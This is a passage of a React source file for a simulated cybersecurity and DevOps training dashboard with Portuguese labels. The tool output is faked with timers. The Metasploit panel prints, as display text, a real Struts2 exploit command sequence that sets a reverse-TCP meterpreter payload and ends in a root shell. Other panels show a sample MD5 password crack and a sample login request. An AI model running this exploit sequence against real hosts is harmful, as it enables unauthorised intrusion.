    { id: 3, time: '0.015600', source: '192.168.1.105', dest: '142.250.184.206', proto: 'TCP', length: 66, info: '44332 > 443 [SYN] Seq=0 Win=64240 Len=0' },
    { id: 4, time: '0.028900', source: '142.250.184.206', dest: '192.168.1.105', proto: 'TCP', length: 66, info: '443 > 44332 [SYN, ACK] Seq=0 Ack=1 Win=65535 Len=0' },
    { id: 5, time: '0.030100', source: '192.168.1.105', dest: '142.250.184.206', proto: 'TCP', length: 54, info: '44332 > 443 [ACK] Seq=1 Ack=1 Win=64240 Len=0' },
  ]);

  const [burpRequest, setBurpRequest] = useState(`POST /api/v1/login HTTP/1.1
Host: api.itreal.life
Content-Type: application/json
Content-Length: 45

{
  "username": "admin",
  "password": "password123"
}`);

  const [hashToCrack, setHashToCrack] = useState('5f4dcc3b5aa765d61d8327deb882cf99'); // "password" in MD5
  const [crackingProgress, setCrackingProgress] = useState(0);
  const [crackedPassword, setCrackedPassword] = useState<string | null>(null);

  const runNmap = () => {
    setIsScanning(true);
    setScanResults(['Starting Nmap 7.92 ( https://nmap.org ) at 2024-04-14 06:55 UTC']);
    
    setTimeout(() => {
      setScanResults(prev => [...prev, `Nmap scan report for ${nmapTarget}`]);
    }, 500);

    setTimeout(() => {
      setScanResults(prev => [...prev, 'Host is up (0.0024s latency).']);
    }, 1000);

    setTimeout(() => {
      setScanResults(prev => [...prev, 
        'Not shown: 997 closed tcp ports (conn-refused)',
        'PORT     STATE SERVICE',
        '22/tcp   open  ssh',
        '80/tcp   open  http',
        '443/tcp  open  https',
        '',
        'Nmap done: 1 IP address (1 host up) scanned in 2.15 seconds'
      ]);
      setIsScanning(false);
    }, 2000);
  };

  const runHashcat = () => {
    setCrackingProgress(0);
    setCrackedPassword(null);
    const interval = setInterval(() => {
      setCrackingProgress(prev => {
        if (prev >= 100) {
          clearInterval(interval);
          setCrackedPassword('password');
          return 100;
        }
        return prev + 10;
      });
    }, 300);
  };

  const tools = [
    { id: 'nmap', label: 'Nmap', icon: Search, color: 'text-blue-500', bg: 'bg-blue-50' },
    { id: 'wireshark', icon: Network, label: 'Wireshark', color: 'text-blue-600', bg: 'bg-blue-100' },
    { id: 'metasploit', icon: Zap, label: 'Metasploit', color: 'text-red-500', bg: 'bg-red-50' },
    { id: 'burp', icon: Globe, label: 'Burp Suite', color: 'text-orange-500', bg: 'bg-orange-50' },
    { id: 'hashcat', icon: Key, label: 'Hashcat', color: 'text-green-500', bg: 'bg-green-50' },
  ];

  const renderSimulation = () => {
    switch (selectedTool) {
      case 'nmap':
        return (
          <div className="space-y-6">
            <div className="flex items-center gap-4">
              <div className="flex-1 bg-slate-100 rounded-xl px-4 py-2 border flex items-center gap-2">
                <span className="text-xs font-bold text-slate-400">Target:</span>
                <input 
                  value={nmapTarget}
                  onChange={(e) => setNmapTarget(e.target.value)}
                  className="bg-transparent border-none outline-none font-mono text-sm flex-1"
                  placeholder="e.g. 192.168.1.1"
                />
              </div>
              <Button 
                onClick={runNmap} 
                disabled={isScanning}
                className="bg-blue-600 hover:bg-blue-700 rounded-xl"
              >
                {isScanning ? <RefreshCw className="w-4 h-4 mr-2 animate-spin" /> : <Play className="w-4 h-4 mr-2" />}
                Scan Network
              </Button>
            </div>
            <div className="bg-slate-950 text-green-500 p-6 rounded-2xl font-mono text-xs h-80 overflow-auto border border-slate-800 shadow-inner">
              {scanResults.map((line, i) => (
                <p key={i} className="mb-1">{line}</p>
              ))}
              {isScanning && <p className="animate-pulse">_</p>}
            </div>
          </div>
        );
      case 'wireshark':
        return (
          <div className="space-y-4">
            <div className="flex items-center justify-between">
              <h3 className="text-sm font-bold text-slate-600 uppercase">Packet Capture (Live)</h3>
              <Badge className="bg-blue-500">Interface: eth0</Badge>
            </div>
            <div className="border rounded-2xl overflow-hidden bg-white shadow-sm">
              <table className="w-full text-[10px]">
                <thead className="bg-slate-50 border-b">
                  <tr>
                    <th className="px-4 py-2 text-left">No.</th>
                    <th className="px-4 py-2 text-left">Time</th>
                    <th className="px-4 py-2 text-left">Source</th>
                    <th className="px-4 py-2 text-left">Destination</th>
                    <th className="px-4 py-2 text-left">Protocol</th>
                    <th className="px-4 py-2 text-left">Length</th>
                    <th className="px-4 py-2 text-left">Info</th>
                  </tr>
                </thead>
                <tbody className="divide-y">
                  {wiresharkPackets.map((p) => (
                    <tr key={p.id} className="hover:bg-blue-50 cursor-pointer transition-colors">
                      <td className="px-4 py-2">{p.id}</td>
                      <td className="px-4 py-2">{p.time}</td>
                      <td className="px-4 py-2 font-mono">{p.source}</td>
                      <td className="px-4 py-2 font-mono">{p.dest}</td>
                      <td className="px-4 py-2">
                        <Badge variant="outline" className={cn(
                          "text-[8px] px-1 h-4",
                          p.proto === 'DNS' ? "border-blue-200 text-blue-600" : "border-green-200 text-green-600"
                        )}>
                          {p.proto}
                        </Badge>
                      </td>
                      <td className="px-4 py-2">{p.length}</td>
                      <td className="px-4 py-2 truncate max-w-[200px]">{p.info}</td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
            <Card className="bg-slate-50 border-slate-200 p-4">
              <h4 className="text-[10px] font-bold text-slate-400 uppercase mb-2">Packet Details</h4>
              <div className="font-mono text-[10px] text-slate-600 space-y-1">
                <p>Frame 1: 74 bytes on wire (592 bits), 74 bytes captured (592 bits)</p>
                <p>Ethernet II, Src: 00:0c:29:ab:cd:ef, Dst: 00:50:56:c0:00:08</p>
                <p>Internet Protocol Version 4, Src: 192.168.1.105, Dst: 8.8.8.8</p>
                <p>User Datagram Protocol, Src Port: 53321, Dst Port: 53</p>
              </div>
            </Card>
          </div>
        );
      case 'metasploit':
        return (
          <div className="space-y-6">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 bg-red-600 rounded-xl flex items-center justify-center text-white font-bold text-xl">M</div>
                <h3 className="text-lg font-bold">Metasploit Framework Console</h3>
              </div>
              <Button className="bg-red-600 hover:bg-red-700 rounded-xl">
                <Zap className="w-4 h-4 mr-2" /> Exploit
              </Button>
            </div>
            <div className="bg-slate-950 text-slate-300 p-6 rounded-2xl font-mono text-xs h-80 overflow-auto border border-slate-800">
              <p className="text-red-500 mb-4">
                {"       =[ metasploit v6.2.0-dev                          ]"} <br/>
                {"+ -- --=[ 2201 exploits - 1164 auxiliary - 395 post       ]"} <br/>
                {"+ -- --=[ 600 payloads - 45 encoders - 11 nops            ]"} <br/>
                {"+ -- --=[ 9 evasion                                       ]"}
              </p>
              <p>msf6 {">"} use exploit/multi/http/struts2_content_type_ognl</p>
              <p>msf6 exploit(multi/http/struts2_content_type_ognl) {">"} set RHOSTS 192.168.1.105</p>
              <p>msf6 exploit(multi/http/struts2_content_type_ognl) {">"} set PAYLOAD linux/x64/meterpreter/reverse_tcp</p>
              <p>msf6 exploit(multi/http/struts2_content_type_ognl) {">"} set LHOST 192.168.1.50</p>
              <p>msf6 exploit(multi/http/struts2_content_type_ognl) {">"} exploit</p>
              <p className="mt-4 text-blue-400">[*] Started reverse TCP handler on 192.168.1.50:4444</p>
              <p className="text-blue-400">[*] Sending stage (3008420 bytes) to 192.168.1.105</p>
              <p className="text-green-500 font-bold">{"[*] Meterpreter session 1 opened (192.168.1.50:4444 -> 192.168.1.105:54321)"}</p>
              <p className="mt-2 text-green-400">meterpreter {">"} shell</p>
              <p className="text-green-400">Process 1234 created.</p>
              <p className="text-green-400">Channel 1 created.</p>
              <p className="text-green-400">id</p>
              <p className="text-green-400">uid=0(root) gid=0(root) groups=0(root)</p>
            </div>
          </div>
        );
      case 'burp':
        return (
          <div className="space-y-6">
            <div className="flex items-center justify-between">
              <h3 className="text-lg font-bold">Burp Suite - Proxy Interceptor</h3>
              <div className="flex gap-2">
                <Button variant="outline" className="text-orange-600 border-orange-200 bg-orange-50">Intercept is ON</Button>
                <Button className="bg-orange-500 hover:bg-orange-600">Forward</Button>
                <Button variant="destructive">Drop</Button>
              </div>
            </div>
            <div className="grid grid-cols-1 gap-6">
              <div className="space-y-2">
                <div className="flex items-center justify-between">
                  <p className="text-xs font-bold text-slate-400 uppercase">Raw HTTP Request</p>
                  <Badge variant="outline" className="text-[10px]">POST /api/v1/login</Badge>
                </div>
                <textarea 
                  value={burpRequest}
                  onChange={(e) => setBurpRequest(e.target.value)}
                  className="w-full h-80 bg-slate-900 text-orange-400 p-6 rounded-2xl font-mono text-sm border-none focus:ring-2 focus:ring-orange-500 outline-none resize-none"
                />
              </div>
            </div>
          </div>
        );
      case 'hashcat':
        return (
          <div className="space-y-6">
            <div className="flex items-center justify-between">
              <h3 className="text-lg font-bold">Hashcat - Advanced Password Recovery</h3>
              <Button 
                onClick={runHashcat}
                disabled={crackingProgress > 0 && crackingProgress < 100}
                className="bg-green-600 hover:bg-green-700 rounded-xl"
              >
                <Play className="w-4 h-4 mr-2" /> Start Cracking
              </Button>
            </div>
            <div className="space-y-4">
              <div className="bg-slate-100 p-4 rounded-xl border">
                <p className="text-xs font-bold text-slate-500 uppercase mb-2">Target Hash (MD5)</p>
                <p className="font-mono text-sm text-slate-700 break-all">{hashToCrack}</p>
              </div>
              
              <div className="space-y-2">
                <div className="flex justify-between text-xs font-bold">
                  <span>Progress</span>
                  <span>{crackingProgress}%</span>
                </div>
                <div className="w-full h-3 bg-slate-200 rounded-full overflow-hidden">
                  <motion.div 
                    initial={{ width: 0 }}
                    animate={{ width: `${crackingProgress}%` }}
                    className="h-full bg-green-500"
                  />
                </div>
              </div>

              {crackedPassword && (
                <motion.div 
                  initial={{ opacity: 0, y: 10 }}
                  animate={{ opacity: 1, y: 0 }}
                  className="bg-green-50 border-2 border-green-500 p-6 rounded-2xl text-center"
                >
                  <CheckCircle2 className="w-8 h-8 text-green-600 mx-auto mb-2" />
                  <h4 className="font-bold text-green-900">Hash Cracked Successfully!</h4>
                  <p className="text-2xl font-black text-green-600 mt-2 font-mono">{crackedPassword}</p>
                </motion.div>
              )}

              <div className="bg-slate-950 text-slate-400 p-4 rounded-xl font-mono text-[10px] h-40 overflow-auto">
                <p>hashcat (v6.2.5) starting...</p>
                <p>OpenCL API (OpenCL 3.0 CUDA 12.0.147) - Platform #1 [NVIDIA Corporation]</p>
                <p>Device #1: NVIDIA GeForce RTX 3080, 10008/10240 MB, 68MCU</p>
                <p className="mt-2">Dictionary cache hit:</p>
                <p>* Filename: rockyou.txt</p>
                <p>* Size: 139921497 bytes</p>
                <p>* Words: 14344384</p>
                <p className="mt-2">Starting attack at {new Date().toLocaleTimeString()}...</p>
                {crackingProgress > 0 && <p className="text-green-500">Status.........: Running</p>}
                {crackingProgress === 100 && <p className="text-green-500">Status.........: Cracked</p>}
              </div>
            </div>
          </div>
        );
      default:
        return null;
    }
  };

  return (
    <div className="space-y-8">
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-3xl font-black text-slate-900 tracking-tight">Cybersecurity Hub</h1>
          <p className="text-slate-500 font-medium">Ferramentas e práticas de segurança defensiva e ofensiva.</p>
        </div>
        <div className="flex gap-3">
          <Badge className="bg-red-100 text-red-700 border-red-200 px-3 py-1">
            <Shield className="w-3 h-3 mr-1" /> Threat Level: Elevated
          </Badge>
        </div>
      </div>

      <div className="grid grid-cols-12 gap-8">
        {/* Tool Selection */}
        <div className="col-span-3 space-y-4">
          <h2 className="text-xs font-bold text-slate-400 uppercase tracking-wider px-2">Security Tools</h2>
          <div className="space-y-2">
            {tools.map((tool) => (
              <button
                key={tool.id}
                onClick={() => setSelectedTool(tool.id)}
                className={cn(
                  "w-full flex items-center gap-3 p-4 rounded-2xl transition-all duration-200 border-2",
                  selectedTool === tool.id 
                    ? "bg-white border-slate-900 shadow-md translate-x-1" 
                    : "bg-slate-50 border-transparent hover:bg-white hover:border-slate-200"
                )}
              >
                <div className={cn("p-2 rounded-xl", tool.bg)}>
                  <tool.icon className={cn("w-5 h-5", tool.color)} />
                </div>
                <span className="font-bold text-sm text-slate-700">{tool.label}</span>
                {selectedTool === tool.id && <ChevronRight className="w-4 h-4 ml-auto text-slate-400" />}
              </button>
            ))}
          </div>

          <Card className="mt-8 bg-slate-900 text-white border-none rounded-3xl overflow-hidden">
            <CardContent className="p-6">
              <div className="flex items-center gap-3 mb-4">
                <div className="p-2 bg-yellow-400 rounded-xl">
                  <AlertTriangle className="w-5 h-5 text-slate-900" />
                </div>
                <h3 className="font-bold">Security Alert</h3>
              </div>
              <p className="text-xs text-slate-400 leading-relaxed mb-4">
                Detectamos múltiplas tentativas de login falhas originadas do IP 45.12.89.21. Recomendamos bloqueio imediato no WAF.
              </p>
              <Button size="sm" className="w-full bg-white text-slate-900 hover:bg-slate-100 rounded-xl font-bold">
                Investigar
              </Button>
            </CardContent>
          </Card>
        </div>

        {/* Simulation Area */}
        <div className="col-span-9 space-y-8">
          <Card className="rounded-3xl border-2 border-slate-100 shadow-sm overflow-hidden min-h-[600px]">
            <CardHeader className="border-b bg-slate-50/50 p-6">
              <div className="flex items-center justify-between">
                <div>
                  <CardTitle className="text-xl font-bold">
                    {tools.find(t => t.id === selectedTool)?.label} Simulation
                  </CardTitle>
                  <CardDescription>
                    Ambiente controlado para testes e demonstração de ferramentas.
                  </CardDescription>
                </div>
                <div className="flex gap-2">
                  <div className="flex items-center gap-1 px-2 py-1 bg-green-100 text-green-700 rounded-md text-[10px] font-bold">
                    <div className="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse" />
                    SANDBOX READY
                  </div>
                </div>
              </div>
            </CardHeader>
            <CardContent className="p-8">
              {renderSimulation()}
            </CardContent>
          </Card>

          {/* Practical Examples */}
          <div className="space-y-4">
            <h2 className="text-xl font-bold text-slate-900">Exemplos Práticos e Scenarios</h2>
            <div className="grid grid-cols-2 gap-6">
              {[
                { 
                  title: 'Prevenção de SQL Injection', 
                  desc: 'Como utilizar Prepared Statements e ORMs para mitigar ataques de injeção.',
                  icon: Database,
                  difficulty: 'Easy'
                },
                { 
                  title: 'Segurança em APIs REST', 
                  desc: 'Implementação de JWT, OAuth2 e Rate Limiting para proteger endpoints.',
                  icon: Globe,
                  difficulty: 'Medium'
                },
                { 
                  title: 'Hardening de Servidores Linux', 
                  desc: 'Configuração de SSH, Iptables e Fail2Ban para reduzir a superfície de ataque.',
                  icon: Server,
                  difficulty: 'Hard'
                },
                { 
                  title: 'Análise de Malware', 
                  desc: 'Técnicas básicas de análise estática e dinâmica em ambientes isolados.',
                  icon: Activity,
                  difficulty: 'Expert'
                }
              ].map((example, i) => (
                <Card key={i} className="group hover:border-slate-900 transition-all cursor-pointer rounded-2xl">
                  <CardContent className="p-6 flex gap-4">
                    <div className="p-3 bg-slate-50 rounded-xl group-hover:bg-slate-900 group-hover:text-white transition-colors">
                      <example.icon className="w-6 h-6" />
                    </div>
                    <div>
                      <div className="flex items-center gap-2 mb-1">
                        <h4 className="font-bold text-slate-900">{example.title}</h4>
                        <Badge variant="outline" className="text-[8px] h-4">{example.difficulty}</Badge>
                      </div>
                      <p className="text-xs text-slate-500 line-clamp-2">{example.desc}</p>
                    </div>
                  </CardContent>
                </Card>
              ))}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

const ToolsView = ({ isApacheRunning, setIsApacheRunning, addLog }: { isApacheRunning: boolean, setIsApacheRunning: (v: boolean) => void, addLog: (m: string) => void }) => {
  const [selectedTool, setSelectedTool] = useState('apache');
  const [ansibleScript, setAnsibleScript] = useState(`- name: Install and configure Nginx
  hosts: webservers
  become: yes
  tasks:
    - name: Install nginx
      apt:
        name: nginx
        state: latest
    - name: Start nginx
      service:
        name: nginx
        state: started`);

  const [terraformScript, setTerraformScript] = useState(`resource "aws_instance" "web" {
  ami           = "ami-0c55b159cbfafe1f0"
  instance_type = "t2.micro"

  tags = {
    Name = "HelloWorld"
  }
}`);

  const [soapRequest, setSoapRequest] = useState(`<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:gar="http://jardinagem.portal/services">
   <soapenv:Header/>
   <soapenv:Body>
      <gar:GetInventoryRequest>
         <gar:CategoryId>PLANTAS</gar:CategoryId>
      </gar:GetInventoryRequest>
   </soapenv:Body>
</soapenv:Envelope>`);

  const [sapTransaction, setSapTransaction] = useState('MM03');
  const [pipelineStatus, setPipelineStatus] = useState<'idle' | 'running' | 'success' | 'failed'>('idle');
  const [pipelineSteps, setPipelineSteps] = useState([
    { id: 'checkout', label: 'Source Checkout', status: 'pending', logs: [] as string[] },
    { id: 'terraform', label: 'Infrastructure (Terraform)', status: 'pending', logs: [] as string[] },
    { id: 'ansible', label: 'Configuration (Ansible)', status: 'pending', logs: [] as string[] },
    { id: 'docker', label: 'Containerization (Docker)', status: 'pending', logs: [] as string[] },
    { id: 'deploy', label: 'Deployment', status: 'pending', logs: [] as string[] },
    { id: 'health', label: 'Health Check', status: 'pending', logs: [] as string[] },
  ]);
  const [activeStepIndex, setActiveStepIndex] = useState(-1);

  const handleRunPipeline = () => {
    if (pipelineStatus === 'running') return;
    
    setPipelineStatus('running');
    setActiveStepIndex(0);
    addLog("[PIPELINE] Starting CI/CD Infrastructure Pipeline...");

    const steps = [
      { id: 'checkout', delay: 1500, logs: ["Cloning repository...", "Checking out branch 'main'...", "Commit: a8f2d3e (Update infra)"] },
      { id: 'terraform', delay: 3000, logs: ["Terraform init...", "Terraform plan: 2 to add, 0 to change, 0 to destroy", "Terraform apply: Creating EC2 instances...", "Infrastructure provisioned."] },
      { id: 'ansible', delay: 2500, logs: ["Running playbook: site.yml", "Task: Install Nginx [OK]", "Task: Configure Firewall [OK]", "Configuration applied."] },
      { id: 'docker', delay: 2000, logs: ["Building images...", "Pushing to registry...", "Docker containers updated."] },
      { id: 'deploy', delay: 1500, logs: ["Rolling update started...", "Service 'portal-web' updated.", "Deployment successful."] },
      { id: 'health', delay: 2000, logs: ["Checking endpoint /health...", "HTTP 200 OK", "System is stable."] },
    ];

    let currentStep = 0;
    
    const runStep = (index: number) => {
      if (index >= steps.length) {
        setPipelineStatus('success');
        addLog("[PIPELINE] Pipeline completed successfully! Infrastructure is LIVE.");
        return;
      }

      setActiveStepIndex(index);
      setPipelineSteps(prev => prev.map((s, i) => i === index ? { ...s, status: 'running' } : s));
      
      steps[index].logs.forEach((log, i) => {
        setTimeout(() => addLog(`[PIPELINE] ${log}`), i * 300);
      });

      setTimeout(() => {
        setPipelineSteps(prev => prev.map((s, i) => i === index ? { ...s, status: 'success', logs: steps[index].logs } : s));
        runStep(index + 1);
      }, steps[index].delay);
    };

    setPipelineSteps(prev => prev.map(s => ({ ...s, status: 'pending', logs: [] })));
    runStep(0);
  };

  const [selectedContainerLogs, setSelectedContainerLogs] = useState<string | null>(null);

  const containerLogs: Record<string, string[]> = {
    'nginx-proxy': [
      '[2024-04-13 14:20:01] GET /index.html 200 12ms',
      '[2024-04-13 14:20:05] GET /api/v1/status 200 8ms',
      '[2024-04-13 14:20:10] GET /assets/logo.png 304 2ms',
      '[2024-04-13 14:20:15] POST /api/v1/login 401 45ms',
      '[2024-04-13 14:20:20] GET /favicon.ico 200 1ms',
    ],
    'api-server': [
      'info: Server started on port 3000',
      'debug: Database connection established',
      'info: New request received: POST /api/v1/auth',
      'warn: High memory usage detected: 128MB',
      'info: Processing background job #452',
    ],
    'redis-cache': [
      '1:M 13 Apr 2024 14:20:00.123 * DB loaded from disk: 0.005 seconds',
      '1:M 13 Apr 2024 14:20:00.124 * Ready to accept connections',
      '1:M 13 Apr 2024 14:20:05.456 - Accepted 127.0.0.1:54321',
      '1:M 13 Apr 2024 14:20:10.789 - Client closed connection',
    ],
    'db-migration': [
      'Migration started: 202404131000_add_users_table',
      'Creating table: users...',
      'Adding index: idx_users_email...',
      'Migration completed successfully.',
    ]
  };

  const prometheusData = [
    { time: '10:00', value: 45 },
    { time: '10:05', value: 52 },
    { time: '10:10', value: 48 },
    { time: '10:15', value: 61 },
    { time: '10:20', value: 55 },
    { time: '10:25', value: 67 },
    { time: '10:30', value: 60 },
    { time: '10:35', value: 72 },
    { time: '10:40', value: 65 },
    { time: '10:45', value: 80 },
  ];

  const grafanaTrafficData = [
    { time: '00:00', success: 400, error: 20 },
    { time: '02:00', success: 320, error: 15 },
    { time: '04:00', success: 300, error: 10 },
    { time: '06:00', success: 550, error: 25 },
    { time: '08:00', success: 980, error: 45 },
    { time: '10:00', success: 1250, error: 60 },
    { time: '12:00', success: 1400, error: 70 },
    { time: '14:00', success: 1350, error: 65 },
    { time: '16:00', success: 1200, error: 55 },
    { time: '18:00', success: 1100, error: 50 },
    { time: '20:00', success: 850, error: 35 },
    { time: '22:00', success: 600, error: 25 },
    { time: '23:59', success: 450, error: 20 },
  ];

  const tools = [
    { id: 'apache', label: 'Apache HTTP', icon: Server, color: 'text-red-600', bg: 'bg-red-50' },
    { id: 'ansible', label: 'Ansible', icon: FileCode, color: 'text-red-500', bg: 'bg-red-50' },
    { id: 'terraform', label: 'Terraform', icon: Zap, color: 'text-purple-500', bg: 'bg-purple-50' },
    { id: 'docker', label: 'Docker', icon: Container, icon2: Box, color: 'text-blue-500', bg: 'bg-blue-50' },
    { id: 'aws', label: 'AWS', icon: Cloud, color: 'text-orange-500', bg: 'bg-orange-50' },
    { id: 'prometheus', label: 'Prometheus', icon: Activity, color: 'text-orange-600', bg: 'bg-orange-100' },
    { id: 'grafana', label: 'Grafana', icon: BarChart3, color: 'text-yellow-600', bg: 'bg-yellow-50' },
    { id: 'soapui', label: 'Soap UI', icon: Globe, color: 'text-blue-600', bg: 'bg-blue-50' },
    { id: 'bonita', label: 'Bonita BPM', icon: Layers, color: 'text-green-600', bg: 'bg-green-50' },
    { id: 'sap', label: 'SAP ERP', icon: Database, color: 'text-blue-800', bg: 'bg-blue-100' },
    { id: 'pipeline', label: 'CI/CD Pipeline', icon: RefreshCw, color: 'text-blue-600', bg: 'bg-blue-50' },
  ];

  const renderSimulation = () => {
    switch (selectedTool) {
      case 'apache':
        return (
          <div className="space-y-8">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-4">
                <div className="w-16 h-16 bg-red-600 rounded-2xl flex items-center justify-center text-white shadow-lg">
                  <Server className="w-10 h-10" />
                </div>
                <div>
                  <h3 className="text-2xl font-black">Apache HTTP Server</h3>
                  <div className="flex items-center gap-2 mt-1">
                    <div className={cn("w-2 h-2 rounded-full animate-pulse", isApacheRunning ? "bg-green-500" : "bg-red-500")} />
                    <span className={cn("text-xs font-bold uppercase tracking-wider", isApacheRunning ? "text-green-600" : "text-red-600")}>
                      {isApacheRunning ? 'Running' : 'Stopped'}
                    </span>
                  </div>
                </div>
              </div>
              <div className="flex gap-3">
                <Button 
                  onClick={() => {
                    setIsApacheRunning(true);
                    addLog("[APACHE] Starting httpd service...");
                    setTimeout(() => addLog("[APACHE] httpd started successfully. Port 80 is listening."), 500);
                  }}
                  disabled={isApacheRunning}
                  className="bg-green-600 hover:bg-green-700 text-white rounded-xl px-6"
                >
                  <Play className="w-4 h-4 mr-2" /> Start
                </Button>
                <Button 
                  onClick={() => {
                    setIsApacheRunning(false);
                    addLog("[APACHE] Stopping httpd service...");
                    setTimeout(() => addLog("[APACHE] httpd stopped. Port 80 is closed."), 500);
                  }}
                  disabled={!isApacheRunning}
                  variant="destructive"
                  className="rounded-xl px-6"
                >
                  <XCircle className="w-4 h-4 mr-2" /> Stop
                </Button>
              </div>
            </div>

            <div className="grid grid-cols-3 gap-6">
              <Card className="bg-slate-50 border-slate-200">
                <CardHeader className="pb-2">
                  <CardTitle className="text-xs font-bold text-slate-400 uppercase">Uptime</CardTitle>
                </CardHeader>
                <CardContent>
                  <p className="text-2xl font-black">{isApacheRunning ? '14d 2h 35m' : '0s'}</p>
                </CardContent>
              </Card>
              <Card className="bg-slate-50 border-slate-200">
                <CardHeader className="pb-2">
                  <CardTitle className="text-xs font-bold text-slate-400 uppercase">Active Connections</CardTitle>
                </CardHeader>
                <CardContent>
                  <p className="text-2xl font-black">{isApacheRunning ? '1,284' : '0'}</p>
                </CardContent>
              </Card>
              <Card className="bg-slate-50 border-slate-200">
                <CardHeader className="pb-2">
                  <CardTitle className="text-xs font-bold text-slate-400 uppercase">CPU Usage</CardTitle>
                </CardHeader>
                <CardContent>
                  <p className="text-2xl font-black">{isApacheRunning ? '4.2%' : '0%'}</p>
                </CardContent>
              </Card>
            </div>

            <div className="space-y-2">
              <h4 className="text-xs font-bold text-slate-400 uppercase tracking-wider">Configuration (httpd.conf)</h4>
              <div className="bg-slate-900 text-slate-300 p-6 rounded-2xl font-mono text-sm border-none overflow-auto h-48">
                <p className="text-blue-400">ServerRoot "/etc/httpd"</p>
                <p className="text-blue-400">Listen 80</p>
                <p className="text-slate-500"># Load modules...</p>
                <p className="text-blue-400">DocumentRoot "/var/www/html"</p>
                <p className="text-blue-400">{"<Directory \"/var/www/html\">"}</p>
                <p className="pl-4">Options Indexes FollowSymLinks</p>
                <p className="pl-4">AllowOverride None</p>
                <p className="pl-4">Require all granted</p>
                <p className="text-blue-400">{"</Directory>"}</p>
              </div>
            </div>
          </div>
        );
      case 'ansible':
        return (
          <div className="space-y-6">
            <div className="flex items-center justify-between">
              <h3 className="text-lg font-bold">Ansible Playbook Editor</h3>
              <Button size="sm" className="bg-red-600 hover:bg-red-700">
                <Play className="w-4 h-4 mr-2" /> Run Playbook
              </Button>
            </div>
            <div className="grid grid-cols-2 gap-6">
              <div className="space-y-2">
                <p className="text-xs font-bold text-slate-400 uppercase">site.yml</p>
                <textarea 
                  value={ansibleScript}
                  onChange={(e) => setAnsibleScript(e.target.value)}
                  className="w-full h-80 bg-slate-900 text-slate-300 p-6 rounded-2xl font-mono text-sm border-none focus:ring-2 focus:ring-red-500 outline-none resize-none"
                />
              </div>
              <div className="space-y-2">
                <p className="text-xs font-bold text-slate-400 uppercase">Execution Output</p>
                <div className="w-full h-80 bg-slate-950 text-green-500 p-6 rounded-2xl font-mono text-xs overflow-auto">
                  <p className="text-slate-400">PLAY [webservers] ************************************************************</p>
                  <p className="mt-2">TASK [Gathering Facts] *********************************************************</p>
                  <p className="text-green-400">ok: [web-01]</p>
                  <p className="text-green-400">ok: [web-02]</p>
                  <p className="mt-2">TASK [Install nginx] ***********************************************************</p>
                  <p className="text-yellow-400">changed: [web-01]</p>
                  <p className="text-yellow-400">changed: [web-02]</p>
                  <p className="mt-2 text-slate-400">PLAY RECAP *********************************************************************</p>
                  <p>web-01 : ok=2 changed=1 unreachable=0 failed=0</p>
                  <p>web-02 : ok=2 changed=1 unreachable=0 failed=0</p>
                </div>
              </div>
            </div>
          </div>
        );
      case 'terraform':
        return (
          <div className="space-y-6">
            <div className="flex items-center justify-between">
              <h3 className="text-lg font-bold">Terraform Cloud Console</h3>
              <div className="flex gap-2">
                <Button variant="outline" size="sm">Plan</Button>
                <Button size="sm" className="bg-purple-600 hover:bg-purple-700">Apply</Button>
              </div>
            </div>
            <div className="grid grid-cols-2 gap-6">
              <div className="space-y-2">
                <p className="text-xs font-bold text-slate-400 uppercase">main.tf</p>
                <textarea 
                  value={terraformScript}
                  onChange={(e) => setTerraformScript(e.target.value)}
                  className="w-full h-80 bg-slate-900 text-slate-300 p-6 rounded-2xl font-mono text-sm border-none focus:ring-2 focus:ring-purple-500 outline-none resize-none"
                />
              </div>
              <Card className="h-80 bg-slate-950 text-slate-300 p-6 rounded-2xl font-mono text-xs overflow-auto border-none shadow-none">
                <CardContent className="p-0 space-y-1">
                  <p className="text-blue-400">Terraform v1.5.0</p>
                  <p>Initializing the backend...</p>
                  <p>Initializing provider plugins...</p>
                  <p className="text-green-500">Terraform has been successfully initialized!</p>
                  <p className="mt-4">Terraform used the selected providers to generate the following execution plan.</p>
                  <p>Resource actions are indicated with the following symbols:</p>
                  <p className="text-green-500">  + create</p>
                  <p className="mt-2">Terraform will perform the following actions:</p>
                  <p className="text-green-500">  # aws_instance.web will be created</p>
                  <p className="text-green-500">  + resource "aws_instance" "web" {"{"}</p>
                  <p className="text-green-500">      + ami                          = "ami-0c55b159cbfafe1f0"</p>
                  <p className="text-green-500">      + instance_type                = "t2.micro"</p>
                  <p className="text-green-500">      + tags                         = {"{"} "Name" = "HelloWorld" {"}"}</p>
                  <p className="text-green-500">    {"}"}</p>
                  <p className="mt-4 font-bold">Plan: 1 to add, 0 to change, 0 to destroy.</p>
                </CardContent>
              </Card>
            </div>
          </div>
        );
      case 'docker':
        return (
          <div className="space-y-6">
            <h3 className="text-lg font-bold">Docker Container Management</h3>
            <div className="grid grid-cols-1 gap-4">
              {[
                { name: 'nginx-proxy', image: 'nginx:latest', status: 'Running', ports: '80:80, 443:443', cpu: '0.5%', mem: '45MB', icon: 'https://cdn.worldvectorlogo.com/logos/nginx-1.svg' },
                { name: 'api-server', image: 'node:18-alpine', status: 'Running', ports: '3000:3000', cpu: '2.1%', mem: '128MB', icon: 'https://cdn.worldvectorlogo.com/logos/nodejs-icon.svg' },
                { name: 'redis-cache', image: 'redis:6.2', status: 'Running', ports: '6379:6379', cpu: '0.1%', mem: '12MB', icon: 'https://cdn.worldvectorlogo.com/logos/redis.svg' },
                { name: 'db-migration', image: 'postgres:15', status: 'Exited (0)', ports: '-', cpu: '-', mem: '-', icon: 'https://cdn.worldvectorlogo.com/logos/postgresql.svg' },
              ].map((container) => (
                <Card key={container.name} className="hover:border-blue-300 transition-colors">
                  <CardContent className="p-4 flex items-center justify-between">
                    <div className="flex items-center gap-4">
                      <div className={cn("p-2 rounded-lg bg-slate-50 border border-slate-100 w-12 h-12 flex items-center justify-center overflow-hidden")}>
                        <img 
                          src={container.icon} 
                          alt={container.name} 
                          className="w-8 h-8 object-contain"
                          referrerPolicy="no-referrer"
                        />
                      </div>
                      <div>
                        <h4 className="font-bold text-sm">{container.name}</h4>
